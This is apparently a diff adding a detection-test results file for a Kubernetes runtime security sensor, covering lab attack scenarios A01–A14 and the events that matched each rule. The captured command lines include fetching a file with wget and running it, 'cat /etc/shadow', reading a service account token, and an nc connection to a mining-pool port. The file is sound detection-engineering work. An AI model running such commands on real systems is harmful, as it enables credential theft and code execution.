@@ -1,0 +1,451 @@
+{
+  "date": "2026-11-25",
+  "sensor": "v0.1.0-34-g5152a65-dirty (tephra/tephrad:dev)",
+  "kernel": "5.15.0-1121-aws",
+  "results": [
+    {
+      "id": "A01",
+      "title": "Reverse shell from a web server pod to a listener pod",
+      "tags": [
+        "attack.execution",
+        "attack.t1059.004"
+      ],
+      "rules": [
+        {
+          "rule": "R001",
+          "verdict": "detected",
+          "latency_ms": 1061,
+          "event": "{\"ts\":\"2026-11-25T13:58:30.805583Z\",\"type\":\"exec\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R001\",\"title\":\"Shell with a network socket as stdin and stdout\",\"level\":\"high\",\"tags\":[\"attack.execution\",\"attack.t1059.004\"]},\"process\":{\"pid\":17326,\"start_time_ns\":590750398095,\"Image\":\"/bin/sh\",\"CommandLine\":\"/bin/sh\",\"uid\":0,\"gid\":0,\"cgroup_id\":18791,\"identity\":\"shell\",\"tree\":\"17256.587366591217\",\"stdin_is_socket\":true,\"stdout_is_socket\":true,\"unlinked\":false,\"setuid\":false,\"argv_truncated\":false,\"inode\":2095992,\"dev\":391,\"cap_effective\":2818844155,\"exe_ctime_ns\":1795614839590074632,\"env_truncated\":false},\"parent\":{\"pid\":17322,\"Image\":\"/bin/sh\",\"CommandLine\":\"/bin/sh run\",\"identity\":\"shell\"},\"ancestors\":[\"/bin/sh\",\"/bin/httpd\",\"/bin/httpd\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"14d81e481c28fb3373936b95505b7a6638a1f28d31e993474e9f3cd98425be15\",\"name\":\"web\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a01-98514b\",\"pod\":\"web\",\"labels\":{\"app\":\"web\"}}}"
+        },
+        {
+          "rule": "R002",
+          "verdict": "detected",
+          "latency_ms": 1058,
+          "event": "{\"ts\":\"2026-11-25T13:58:30.802699Z\",\"type\":\"exec\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R002\",\"title\":\"Shell spawned under a network-facing server process\",\"level\":\"medium\",\"tags\":[\"attack.execution\",\"attack.t1059.004\"]},\"process\":{\"pid\":17322,\"start_time_ns\":590748818565,\"Image\":\"/bin/sh\",\"CommandLine\":\"/bin/sh run\",\"uid\":0,\"gid\":0,\"cgroup_id\":18791,\"identity\":\"shell\",\"tree\":\"17256.587366591217\",\"stdin_is_socket\":false,\"stdout_is_socket\":false,\"unlinked\":false,\"setuid\":false,\"argv_truncated\":false,\"inode\":2095992,\"dev\":391,\"cap_effective\":2818844155,\"exe_ctime_ns\":1795615107446156422,\"env_truncated\":false},\"parent\":{\"pid\":17321,\"Image\":\"/bin/httpd\",\"CommandLine\":\"httpd -f -p 8080 -h /www\",\"is_main_binary\":true},\"ancestors\":[\"/bin/httpd\",\"/bin/httpd\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"14d81e481c28fb3373936b95505b7a6638a1f28d31e993474e9f3cd98425be15\",\"name\":\"web\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a01-98514b\",\"pod\":\"web\",\"labels\":{\"app\":\"web\"}}}"
+        }
+      ],
+      "also_fired": [
+        "R004",
+        "R027"
+      ],
+      "visible_ms": 5072,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A02",
+      "title": "Run a harmless binary from a memfd with no file on disk",
+      "tags": [
+        "attack.defense_evasion",
+        "attack.t1620"
+      ],
+      "rules": [
+        {
+          "rule": "R003",
+          "verdict": "detected",
+          "latency_ms": 70,
+          "event": "{\"ts\":\"2026-11-25T13:58:53.956035Z\",\"type\":\"exec\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R003\",\"title\":\"Execution of a memfd or already-unlinked binary\",\"level\":\"high\",\"tags\":[\"attack.defense_evasion\",\"attack.t1620\"]},\"process\":{\"pid\":17655,\"start_time_ns\":613887145864,\"Image\":\"/proc/self/fd/3\",\"CommandLine\":\"true\",\"uid\":0,\"gid\":0,\"cgroup_id\":18986,\"exe_modified\":true,\"tree\":\"17649.613883758988\",\"stdin_is_socket\":false,\"stdout_is_socket\":false,\"unlinked\":true,\"setuid\":false,\"argv_truncated\":false,\"inode\":1040,\"dev\":1,\"cap_effective\":2818844155,\"exe_ctime_ns\":1795615133950165317,\"env_truncated\":false},\"parent\":{\"pid\":17649,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"6c1b84c7f983e0613d2cb19affb58f30e82b3296efbf8d00df1077364078dedd\",\"name\":\"victim\",\"image\":\"docker.io/library/python:3.14-alpine\"},\"k8s\":{\"namespace\":\"tephra-a02-a2e4db\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}}}"
+        }
+      ],
+      "also_fired": [
+        "R032"
+      ],
+      "visible_ms": 2103,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A03",
+      "title": "Download a tool into a running container and execute it",
+      "tags": [
+        "attack.command_and_control",
+        "attack.t1105"
+      ],
+      "rules": [
+        {
+          "rule": "R004",
+          "verdict": "detected",
+          "latency_ms": 51,
+          "event": "{\"ts\":\"2026-11-25T13:59:08.746741Z\",\"type\":\"exec\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R004\",\"title\":\"Download or package tool run in a container\",\"level\":\"low\",\"tags\":[\"attack.command_and_control\",\"attack.t1105\"]},\"process\":{\"pid\":17984,\"start_time_ns\":628692772105,\"Image\":\"/bin/wget\",\"CommandLine\":\"wget -q -O /tmp/tool http://files:8080/tool\",\"uid\":0,\"gid\":0,\"cgroup_id\":19311,\"identity\":\"download_tool\",\"tree\":\"17978.628689076028\",\"stdin_is_socket\":false,\"stdout_is_socket\":false,\"unlinked\":false,\"setuid\":false,\"argv_truncated\":false,\"inode\":2095992,\"dev\":419,\"cap_effective\":2818844155,\"exe_ctime_ns\":1795614839590074632,\"env_truncated\":false},\"parent\":{\"pid\":17978,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/sbin/runc\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"546adeb630f9326eb9a7f112e7ab309d5d204db0aeaac0c90e657b889b5f75f2\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a03-d7cbe6\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}}}"
+        },
+        {
+          "rule": "R025",
+          "verdict": "detected",
+          "latency_ms": 54,
+          "event": "{\"ts\":\"2026-11-25T13:59:08.749136Z\",\"type\":\"exec\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R025\",\"title\":\"File fetched into a container and then executed\",\"level\":\"high\",\"tags\":[\"attack.command_and_control\",\"attack.t1105\",\"attack.execution\",\"attack.t1059\"]},\"process\":{\"pid\":17987,\"start_time_ns\":628695244539,\"Image\":\"/bin/sh\",\"CommandLine\":\"/bin/sh /tmp/tool\",\"uid\":0,\"gid\":0,\"cgroup_id\":19311,\"identity\":\"shell\",\"exe_modified\":true,\"tree\":\"17978.628689076028\",\"stdin_is_socket\":false,\"stdout_is_socket\":false,\"unlinked\":false,\"setuid\":false,\"argv_truncated\":false,\"inode\":2095992,\"dev\":419,\"cap_effective\":2818844155,\"exe_ctime_ns\":1795615148742170058,\"env_truncated\":false},\"parent\":{\"pid\":17978,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/sbin/runc\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"546adeb630f9326eb9a7f112e7ab309d5d204db0aeaac0c90e657b889b5f75f2\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a03-d7cbe6\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}}}"
+        }
+      ],
+      "also_fired": [
+        "R032"
+      ],
+      "visible_ms": 2083,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A04",
+      "title": "Read /etc/shadow from a non-system process",
+      "tags": [
+        "attack.credential_access",
+        "attack.t1003.008"
+      ],
+      "rules": [
+        {
+          "rule": "R005",
+          "verdict": "detected",
+          "latency_ms": 56,
+          "event": "{\"ts\":\"2026-11-25T13:59:26.138189Z\",\"type\":\"file_open\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R005\",\"title\":\"/etc/shadow opened by a process outside the allowlist\",\"level\":\"high\",\"tags\":[\"attack.credential_access\",\"attack.t1003.008\"]},\"process\":{\"pid\":18513,\"start_time_ns\":646083706857,\"Image\":\"/bin/cat\",\"CommandLine\":\"cat /etc/shadow\",\"uid\":0,\"gid\":0,\"cgroup_id\":19571,\"tree\":\"18507.646079422956\"},\"parent\":{\"pid\":18507,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/sbin/runc\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"d39b0e7003658c3258359c15fce8ed746ab7d4920fe339b3af4ca9d9ccf66ca2\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a04-8e3539\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/etc/shadow\",\"flags\":32768,\"write\":false,\"truncate\":false,\"inode\":2097803,\"dev\":351,\"matched_by\":\"inode\"}}"
+        }
+      ],
+      "visible_ms": 2086,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A05",
+      "title": "Read the service account token, then query the Kubernetes API",
+      "tags": [
+        "attack.credential_access",
+        "attack.t1528",
+        "attack.t1613"
+      ],
+      "rules": [
+        {
+          "rule": "R006",
+          "verdict": "detected",
+          "latency_ms": 54,
+          "event": "{\"ts\":\"2026-11-25T13:59:41.000243Z\",\"type\":\"file_open\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R006\",\"title\":\"Service account token read by a process other than the pod's main binary\",\"level\":\"medium\",\"tags\":[\"attack.credential_access\",\"attack.t1528\"]},\"process\":{\"pid\":18732,\"start_time_ns\":660945857920,\"Image\":\"/bin/cat\",\"CommandLine\":\"cat /var/run/secrets/kubernetes.io/serviceaccount/token\",\"uid\":0,\"gid\":0,\"cgroup_id\":19766,\"tree\":\"18726.660942080634\"},\"parent\":{\"pid\":18726,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"5c3fe44f34dff17fa5fa82b1d61b513fad230ac400469de38dd5d5b2b54098e9\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a05-073fc3\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/var/run/secrets/kubernetes.io/serviceaccount/..2026_11_25_13_59_36.122247093/token\",\"flags\":32768,\"write\":false,\"truncate\":false,\"inode\":3,\"dev\":317,\"matched_by\":\"device\",\"k8s_credential\":\"sa_token\",\"credential_pod\":\"tephra-a01-98514b/listener\",\"credential_other_pod\":true}}"
+        },
+        {
+          "rule": "R013",
+          "verdict": "detected",
+          "latency_ms": 54,
+          "event": "{\"ts\":\"2026-11-25T13:59:41.001168Z\",\"type\":\"connect\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R013\",\"title\":\"Connection to the Kubernetes API from an unexpected binary\",\"level\":\"medium\",\"tags\":[\"attack.discovery\",\"attack.t1613\"]},\"process\":{\"pid\":18733,\"start_time_ns\":660946636000,\"Image\":\"/bin/wget\",\"CommandLine\":\"wget -q -T 5 -O /dev/null --no-check-certificate https://10.96.0.1:443/api\",\"uid\":0,\"gid\":0,\"cgroup_id\":19766,\"identity\":\"download_tool\",\"tree\":\"18726.660942080634\"},\"parent\":{\"pid\":18726,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"5c3fe44f34dff17fa5fa82b1d61b513fad230ac400469de38dd5d5b2b54098e9\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a05-073fc3\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"network\":{\"direction\":\"outbound\",\"family\":\"ipv4\",\"protocol\":\"tcp\",\"DestinationIp\":\"10.96.0.1\",\"DestinationPort\":443,\"is_k8s_api\":true}}"
+        },
+        {
+          "rule": "R026",
+          "verdict": "detected",
+          "latency_ms": 54,
+          "event": "{\"ts\":\"2026-11-25T13:59:41.001168Z\",\"type\":\"connect\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R026\",\"title\":\"Service account token read, then the Kubernetes API contacted\",\"level\":\"high\",\"tags\":[\"attack.credential_access\",\"attack.t1528\",\"attack.discovery\",\"attack.t1613\"]},\"process\":{\"pid\":18733,\"start_time_ns\":660946636000,\"Image\":\"/bin/wget\",\"CommandLine\":\"wget -q -T 5 -O /dev/null --no-check-certificate https://10.96.0.1:443/api\",\"uid\":0,\"gid\":0,\"cgroup_id\":19766,\"identity\":\"download_tool\",\"tree\":\"18726.660942080634\"},\"parent\":{\"pid\":18726,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"5c3fe44f34dff17fa5fa82b1d61b513fad230ac400469de38dd5d5b2b54098e9\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a05-073fc3\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"network\":{\"direction\":\"outbound\",\"family\":\"ipv4\",\"protocol\":\"tcp\",\"DestinationIp\":\"10.96.0.1\",\"DestinationPort\":443,\"is_k8s_api\":true}}"
+        }
+      ],
+      "also_fired": [
+        "R004"
+      ],
+      "visible_ms": 3141,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A06",
+      "title": "Write an entry to /etc/ld.so.preload",
+      "tags": [
+        "attack.persistence",
+        "attack.t1574.006"
+      ],
+      "rules": [
+        {
+          "rule": "R007",
+          "verdict": "detected",
+          "latency_ms": 51,
+          "event": "{\"ts\":\"2026-11-25T13:59:56.685216Z\",\"type\":\"file_open\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R007\",\"title\":\"Write to /etc/ld.so.preload\",\"level\":\"high\",\"tags\":[\"attack.persistence\",\"attack.t1574.006\"]},\"process\":{\"pid\":18951,\"start_time_ns\":676627410130,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"uid\":0,\"gid\":0,\"cgroup_id\":19994,\"is_main_binary\":true,\"identity\":\"shell\",\"tree\":\"18951.676627410130\"},\"parent\":{\"pid\":18866,\"Image\":\"/usr/local/bin/containerd-shim-runc-v2\",\"CommandLine\":\"/usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id 255406d04a2d8d3b8a20318dc494a6feef43957b1cc57860a633e6009153f01b -address /run/containerd/containerd.sock\",\"runtime\":true},\"ancestors\":[\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"882a9c6d290aba627b4fe8d6f937bdd25f6ffbe876b165e55c0f1a8c7423e661\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a06-15e358\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/etc/ld.so.preload\",\"flags\":33857,\"write\":true,\"truncate\":false,\"inode\":2108639,\"dev\":351,\"matched_by\":\"path\"}}"
+        }
+      ],
+      "visible_ms": 2083,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A07",
+      "title": "Add a cron entry",
+      "tags": [
+        "attack.persistence",
+        "attack.t1053.003"
+      ],
+      "rules": [
+        {
+          "rule": "R008",
+          "verdict": "detected",
+          "latency_ms": 52,
+          "event": "{\"ts\":\"2026-11-25T14:00:13.635608Z\",\"type\":\"file_open\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R008\",\"title\":\"Write under a cron directory\",\"level\":\"medium\",\"tags\":[\"attack.persistence\",\"attack.t1053.003\"]},\"process\":{\"pid\":19193,\"start_time_ns\":693577480081,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"uid\":0,\"gid\":0,\"cgroup_id\":20189,\"is_main_binary\":true,\"identity\":\"shell\",\"tree\":\"19193.693577480081\"},\"parent\":{\"pid\":19111,\"Image\":\"/usr/local/bin/containerd-shim-runc-v2\",\"CommandLine\":\"/usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id 8f9891a3b73d1f3ff756f9ac3d86332a7d1f86e2eb8f5b5afe787e310896f339 -address /run/containerd/containerd.sock\",\"runtime\":true},\"ancestors\":[\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"b2ae091f2583c95f1f6730d3adc1779eeda2a9bf4573dd89b67b309d62809e6f\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a07-96d243\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/etc/cron.d/harness\",\"flags\":33345,\"write\":true,\"truncate\":true,\"inode\":2108703,\"dev\":351,\"matched_by\":\"path\"}}"
+        }
+      ],
+      "visible_ms": 2081,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A08",
+      "title": "Append a key to authorized_keys",
+      "tags": [
+        "attack.persistence",
+        "attack.t1098.004"
+      ],
+      "rules": [
+        {
+          "rule": "R009",
+          "verdict": "detected",
+          "latency_ms": 54,
+          "event": "{\"ts\":\"2026-11-25T14:00:30.930665Z\",\"type\":\"file_open\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R009\",\"title\":\"Write to an authorized_keys file\",\"level\":\"high\",\"tags\":[\"attack.persistence\",\"attack.t1098.004\"]},\"process\":{\"pid\":19700,\"start_time_ns\":710871838711,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"uid\":0,\"gid\":0,\"cgroup_id\":20384,\"is_main_binary\":true,\"identity\":\"shell\",\"tree\":\"19700.710871838711\"},\"parent\":{\"pid\":19617,\"Image\":\"/usr/local/bin/containerd-shim-runc-v2\",\"CommandLine\":\"/usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id edcff3fd88e025ee19525d49eceffd5bfcdfadb2018a56c87d0a4919d6bf0454 -address /run/containerd/containerd.sock\",\"runtime\":true},\"ancestors\":[\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"14ed714b8fa9fc37128116590d5a6523e71b042c72bb3f746c7f61b30875ba02\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a08-0ff18a\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/root/.ssh/authorized_keys\",\"flags\":33857,\"write\":true,\"truncate\":false,\"inode\":2103882,\"dev\":351,\"matched_by\":\"name\"}}"
+        }
+      ],
+      "visible_ms": 3095,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A09",
+      "title": "Open the containerd socket through a hostPath mount",
+      "tags": [
+        "attack.privilege_escalation",
+        "attack.t1611"
+      ],
+      "rules": [
+        {
+          "rule": "R010",
+          "verdict": "detected",
+          "latency_ms": 98,
+          "event": "{\"ts\":\"2026-11-25T14:00:48.769842Z\",\"type\":\"connect\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R010\",\"title\":\"Connection to the container runtime's Unix socket from inside a container\",\"level\":\"critical\",\"tags\":[\"attack.privilege_escalation\",\"attack.t1611\"]},\"process\":{\"pid\":19929,\"start_time_ns\":728672715357,\"Image\":\"/usr/local/bin/python3\",\"CommandLine\":\"python3 -\",\"uid\":0,\"gid\":0,\"cgroup_id\":20579,\"identity\":\"interpreter\",\"tree\":\"19923.728669008253\"},\"parent\":{\"pid\":19923,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"eb985483d9429a4ae5aadf2c9c2261d20887cec137dcdf882bdd67c4f6a9224f\",\"name\":\"victim\",\"image\":\"docker.io/library/python:3.14-alpine\"},\"k8s\":{\"namespace\":\"tephra-a09-a40b76\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"network\":{\"direction\":\"outbound\",\"family\":\"unix\",\"unix_path\":\"/run/containerd/containerd.sock\"}}"
+        }
+      ],
+      "also_fired": [
+        "R028"
+      ],
+      "visible_ms": 2131,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A10",
+      "title": "Write a cgroup release_agent from a privileged pod",
+      "tags": [
+        "attack.privilege_escalation",
+        "attack.t1611"
+      ],
+      "rules": [
+        {
+          "rule": "R011",
+          "verdict": "detected",
+          "latency_ms": 53,
+          "event": "{\"ts\":\"2026-11-25T14:01:06.039284Z\",\"type\":\"file_open\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R011\",\"title\":\"Write to a cgroup release_agent or to core_pattern\",\"level\":\"critical\",\"tags\":[\"attack.privilege_escalation\",\"attack.t1611\"]},\"process\":{\"pid\":20145,\"start_time_ns\":745979957664,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"uid\":0,\"gid\":0,\"cgroup_id\":20774,\"is_main_binary\":true,\"identity\":\"shell\",\"tree\":\"20145.745979957664\"},\"parent\":{\"pid\":20061,\"Image\":\"/usr/local/bin/containerd-shim-runc-v2\",\"CommandLine\":\"/usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id 7acfa28b55c8e5160adc2a234166c7cc5dbdee073a88dc389492e3d57f97d85f -address /run/containerd/containerd.sock\",\"runtime\":true},\"ancestors\":[\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"399b3367c3db829ba31df9127b748d62dc183ce15bae8d0dd685dc75a09aec8a\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a10-56a0e8\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/tmp/cgrp/release_agent\",\"flags\":33345,\"write\":true,\"truncate\":true,\"inode\":2108675,\"dev\":351,\"matched_by\":\"name\"}}"
+        }
+      ],
+      "also_fired": [
+        "R017"
+      ],
+      "visible_ms": 2086,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A11",
+      "title": "Truncate shell history",
+      "tags": [
+        "attack.defense_evasion",
+        "attack.t1070.003"
+      ],
+      "rules": [
+        {
+          "rule": "R012",
+          "verdict": "detected",
+          "latency_ms": 54,
+          "event": "{\"ts\":\"2026-11-25T14:01:20.375855Z\",\"type\":\"file_open\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R012\",\"title\":\"Shell history truncated\",\"level\":\"low\",\"tags\":[\"attack.defense_evasion\",\"attack.t1070.003\"]},\"process\":{\"pid\":20551,\"start_time_ns\":760318484273,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"uid\":0,\"gid\":0,\"cgroup_id\":20969,\"is_main_binary\":true,\"identity\":\"shell\",\"tree\":\"20551.760318484273\"},\"parent\":{\"pid\":20467,\"Image\":\"/usr/local/bin/containerd-shim-runc-v2\",\"CommandLine\":\"/usr/local/bin/containerd-shim-runc-v2 -namespace k8s.io -id acb65bc300a6f9ba1b453366974a941753191ba6b01f9dafa7d9d5dcd9c5f828 -address /run/containerd/containerd.sock\",\"runtime\":true},\"ancestors\":[\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"82bd61d86b83be52c09d8c6b0e15abbbe46ca30d9ae91d5ff14b55d2cce9f4ef\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a11-be6790\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"file\":{\"path\":\"/root/.ash_history\",\"flags\":33345,\"write\":true,\"truncate\":true,\"inode\":2108639,\"dev\":351,\"matched_by\":\"name\"}}"
+        }
+      ],
+      "visible_ms": 2084,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A12",
+      "title": "Connect to a lab listener on a mining-pool port",
+      "tags": [
+        "attack.impact",
+        "attack.t1496"
+      ],
+      "rules": [
+        {
+          "rule": "R014",
+          "verdict": "detected",
+          "latency_ms": 53,
+          "event": "{\"ts\":\"2026-11-25T14:01:34.805034Z\",\"type\":\"connect\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R014\",\"title\":\"Outbound connection to a common mining-pool port\",\"level\":\"low\",\"tags\":[\"attack.impact\",\"attack.t1496\"]},\"process\":{\"pid\":20888,\"start_time_ns\":774750193867,\"Image\":\"/bin/nc\",\"CommandLine\":\"nc -w 2 pool 3333\",\"uid\":0,\"gid\":0,\"cgroup_id\":21229,\"identity\":\"download_tool\",\"tree\":\"20881.774746547761\"},\"parent\":{\"pid\":20881,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/sbin/runc\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"a04abb60d94a9d6366a219a15f6e7164b13dcbaf76656fad17b934a0687d9909\",\"name\":\"victim\",\"image\":\"docker.io/library/busybox:1.37\"},\"k8s\":{\"namespace\":\"tephra-a12-6964c7\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"network\":{\"direction\":\"outbound\",\"family\":\"ipv4\",\"protocol\":\"tcp\",\"SourcePort\":39095,\"DestinationIp\":\"10.244.1.26\",\"DestinationPort\":3333}}"
+        }
+      ],
+      "also_fired": [
+        "R004"
+      ],
+      "visible_ms": 2084,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A13",
+      "title": "ptrace attach to a neighbouring process",
+      "tags": [
+        "attack.defense_evasion",
+        "attack.t1055.008"
+      ],
+      "rules": [
+        {
+          "rule": "R015",
+          "verdict": "detected",
+          "latency_ms": 184,
+          "event": "{\"ts\":\"2026-11-25T14:01:52.455692Z\",\"type\":\"ptrace\",\"node\":\"tephra-worker2\",\"rule\":{\"id\":\"R015\",\"title\":\"Attach-level access to another process\",\"level\":\"high\",\"tags\":[\"attack.defense_evasion\",\"attack.t1055.008\"]},\"process\":{\"pid\":21203,\"start_time_ns\":792270794457,\"Image\":\"/usr/local/bin/python3\",\"CommandLine\":\"python3 -\",\"uid\":0,\"gid\":0,\"cgroup_id\":21554,\"identity\":\"interpreter\",\"tree\":\"21197.792267358501\"},\"parent\":{\"pid\":21197,\"Image\":\"/bin/sh\",\"CommandLine\":\"sh -s\",\"identity\":\"shell\",\"is_main_binary\":true},\"ancestors\":[\"/bin/sh\",\"/usr/local/bin/containerd-shim-runc-v2\",\"/usr/lib/systemd/systemd\"],\"container\":{\"id\":\"d1905f9b15a0f69a8830789804a8f32dfe782039ecd22afc5520bd2aee2b46d5\",\"name\":\"victim\",\"image\":\"docker.io/library/python:3.14-alpine\"},\"k8s\":{\"namespace\":\"tephra-a13-4f4623\",\"pod\":\"victim\",\"labels\":{\"app\":\"victim\"}},\"ptrace\":{\"target_pid\":21204,\"target_image\":\"/bin/sleep\",\"target_command_line\":\"sleep 30\",\"mode\":18}}"
+        }
+      ],
+      "visible_ms": 2219,
+      "ring_buffer_drops": 0
+    },
+    {
+      "id": "A14",
+      "title": "Load a benign kernel module from a privileged pod",
+      "tags": [
+        "attack.persistence",
+        "attack.t1547.006"
+      ],
+      "rules": [
+        {
+          "rule": "R016",
+          "verdict": "detected",
+          "latency_ms": 179,
